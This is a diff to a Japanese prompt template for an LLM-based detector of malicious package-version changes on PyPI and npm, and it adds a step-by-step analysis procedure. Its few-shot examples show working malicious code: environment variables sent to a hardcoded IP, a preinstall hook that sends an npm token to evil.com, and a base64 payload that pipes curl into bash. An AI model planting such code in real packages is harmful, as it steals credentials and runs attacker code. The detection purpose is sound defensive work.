@@ -6,68 +6,85 @@
 - パッケージ名: {package_name}
 - バージョン変更: {old_version} → {new_version}
 
----
-
-## 過去に実際に検出された悪意ある変更パターン（Few-shot examples）
-
-### 例1: 環境変数窃取 (ctx 0.2.0→0.2.1, PyPI)
-```diff
-+import os, base64, urllib.request
-+def _send(d):
-+    urllib.request.urlopen(urllib.request.Request(
-+        'http://195.123.234.11:8080/collect',
-+        data=base64.b64encode('\n'.join(f'{k}={v}' for k,v in os.environ.items()).encode())
-+    ))
-+_send('')
-```
-→ 判定: MALICIOUS / CRITICAL / EXFILTRATION (CWE-200)
-
-### 例2: postinstall経由のペイロード実行 (ua-parser-js 0.7.28→0.7.29, npm)
-```diff
- "scripts": {
-+  "preinstall": "node -e \"const http=require('http');const os=require('os');...\"",
-   "test": "..."
-```
-→ 判定: MALICIOUS / CRITICAL / BUILD_HOOK_ABUSE (CWE-829)
-
-### 例3: 依存パッケージ経由の隠蔽 (event-stream 3.3.5→3.3.6, npm)
-```diff
--  "dependencies": {},
-+  "dependencies": {
-+    "flatmap-stream": "0.1.1"
-+  }
-```
-→ 判定: MALICIOUS / CRITICAL / DEPENDENCY_CONFUSION (後続の flatmap-stream がペイロードを含む)
-
-### 例4: 難読化+実行 (典型的パターン)
-```diff
-+_x = __import__('base64').b64decode(b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3AgfCBiYXNoJyk=')
-+exec(compile(_x, '<string>', 'exec'))
-```
-→ 判定: MALICIOUS / CRITICAL / OBFUSCATION + EXECUTION (CWE-506)
+{pre_analysis_context}
 
 ---
 
-## 分析する脅威カテゴリ
+## 分析手順（Chain-of-Thought — 必ずこの順序で思考すること）
 
-1. **OBFUSCATION** (CWE-506): base64/hex/XOR + eval/exec、難読化変数名
-2. **NETWORK** (CWE-913): ハードコードIP/URL、C2接続、DNSトンネリング
-3. **PERSISTENCE** (CWE-693): cron/systemd/レジストリ/シェルプロファイルへの書き込み
-4. **EXFILTRATION** (CWE-200): 環境変数・SSHキー・クラウドクレデンシャルの外部送信
-5. **EXECUTION** (CWE-78): subprocess shell=True、os.system、動的コード実行
-6. **STEGANOGRAPHY** (CWE-116): バイナリへのペイロード埋め込み
-7. **TYPOSQUATTING** (CWE-1021): 人気パッケージへの類似命名（メタデータ確認）
-8. **DEPENDENCY_CONFUSION** (CWE-1021): 新規依存パッケージの追加（特に無名パッケージ）
-9. **BUILD_HOOK_ABUSE** (CWE-829): setup.py/postinstall/preinstallへのコード実行追加
-10. **METADATA_MANIPULATION** (CWE-345): maintainer/homepage URLの不審な変更
+### Step 1: ネットワーク呼び出しを列挙せよ
+追加行（+で始まる行）の中で、外部へのネットワーク接続を行う可能性があるコードをすべて列挙する。
+- urllib, requests, http.client, socket, aiohttp, httpx, fetch, XMLHttpRequest, axios など
+- ハードコードされたURL・IPアドレスを含む行
 
-## 重点的に見るべき箇所
-- `setup.py`, `__init__.py`, `index.js`, `package.json` の追加行（+）
-- `install_requires`, `dependencies`, `devDependencies` の新規エントリ
-- バイナリファイルの追加
+### Step 2: 認証情報・機密データアクセスを列挙せよ
+- os.environ, os.getenv, process.env でAPIキー・パスワード・トークンを読む行
+- ~/.ssh/, ~/.aws/, ~/.config/ などの認証情報ファイルを読む行
+- ブラウザのCookieストア、パスワードマネージャーへのアクセス
+
+### Step 3: コード実行・難読化を列挙せよ
+- exec(), eval(), compile() の使用
+- base64/hex/rot13でエンコードされた文字列 + デコード後の実行
+- getattr()を使った関数名の難読化
+- chr()連結やunicode escapeによる文字列構築
+
+### Step 4: インストール時実行フックを確認せよ
+- setup.py の cmdclass, install_requires, entry_points
+- package.json の scripts.postinstall, scripts.preinstall, scripts.install
+- binding.gyp の追加
+
+### Step 5: Step 1〜4の結果を接続せよ
+Step 1（ネットワーク）とStep 2（機密データ）が接続されているか？
+→ 接続あり = EXFILTRATION (CRITICAL)
+
+Step 3（コード実行）があり、難読化されているか？
+→ あり = OBFUSCATION (HIGH以上)
+
+Step 4（インストールフック）にStep 3の実行コードが含まれるか？
+→ あり = BUILD_HOOK_ABUSE (CRITICAL)
+
+---
+
+## 過去の実際の攻撃例（Few-shot）
+
+### PyPI: ctx 0.2.1 (EXFILTRATION)
+```diff
++import base64, urllib.request
++_d = lambda: urllib.request.urlopen(urllib.request.Request(
++    'http://195.123.234.11:8080/c',
++    data=base64.b64encode('\n'.join(f'{k}={v}' for k,v in __import__('os').environ.items()).encode())
++))
++_d()
+```
+Step1: urllib.request → 外部IP。Step2: os.environ 全読み。Step3: base64エンコード。Step5: 1+2接続 → CRITICAL EXFILTRATION。
+
+### npm: ua-parser-js 0.7.29 (BUILD_HOOK_ABUSE)
+```diff
++"scripts": {
++  "preinstall": "node -e \"const cp=require('child_process');cp.exec('curl http://evil.com/'+process.env.npm_token);\""
++}
+```
+Step4: preinstall追加。Step1: curl外部送信。Step2: npm_token読み取り。Step5: 全接続 → CRITICAL BUILD_HOOK_ABUSE + EXFILTRATION。
+
+### PyPI: getattr難読化 (OBFUSCATION)
+```diff
++_f = getattr(__builtins__, 'ex' + 'ec')
++_f(compile(__import__('base64').b64decode(PAYLOAD), '<s>', 'exec'))
+```
+Step3: getattr難読化 + base64デコード + exec。Step5: 難読化あり → CRITICAL OBFUSCATION。
+
+---
+
+## 脅威カテゴリ
+1. OBFUSCATION (CWE-506) / 2. NETWORK (CWE-913) / 3. PERSISTENCE (CWE-693)
+4. EXFILTRATION (CWE-200) / 5. EXECUTION (CWE-78) / 6. STEGANOGRAPHY (CWE-116)
+7. TYPOSQUATTING (CWE-1021) / 8. DEPENDENCY_CONFUSION (CWE-1021)
+9. BUILD_HOOK_ABUSE (CWE-829) / 10. METADATA_MANIPULATION (CWE-345)
+
+---
 
 ## 出力フォーマット
-応答は必ず以下のJSONのみ（前後に文章・```不要）:
+Step 1〜5 の思考結果を経て、最終判定を以下のJSON形式のみで出力（前後に文章・```不要）:
 {{
   "verdict": "MALICIOUS",
   "severity": "CRITICAL",
@@ -75,7 +92,7 @@
   "findings": [
     {{
       "category": "EXFILTRATION",
-      "description": "AWS_SECRET_ACCESS_KEYを外部IPへ送信するコードが追加された",
+      "description": "Step2で検出した環境変数がStep1の外部URLに送信される（Step5で接続確認）",
       "file": "pkg/__init__.py",
       "line_start": 5,
       "line_end": 12,
@@ -87,8 +104,8 @@
   "summary": "総合評価（日本語・200文字以内）"
 }}
 
-verdict: MALICIOUS（確実） / SUSPICIOUS（疑わしい） / BENIGN（問題なし） / UNKNOWN（判断不能）
-findings が空なら []
+findingsが空なら []
+verdict: MALICIOUS（確実）/ SUSPICIOUS（疑わしい）/ BENIGN（問題なし）/ UNKNOWN（判断不能）
 
 ---
 {diff_chunk}
